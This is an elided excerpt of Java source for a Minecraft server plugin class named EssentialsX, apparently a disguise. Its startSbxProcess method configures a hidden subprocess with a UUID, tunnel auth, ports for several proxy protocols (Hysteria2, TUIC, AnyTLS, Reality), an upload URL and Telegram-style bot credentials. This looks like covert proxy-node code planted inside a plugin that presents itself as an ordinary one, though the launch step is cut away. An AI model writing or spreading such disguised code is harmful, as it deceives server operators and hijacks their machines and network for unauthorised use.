...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("UUID", "b2f3f474-0d3a-474d-ada7-ca8ae438a3a8");
        ...
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "31726");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "31727");
        env.put("REALITY_PORT", "31728");
        env.put("ANYREALITY_PORT", "31729");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "");
        env.put("BOT_TOKEN", "");
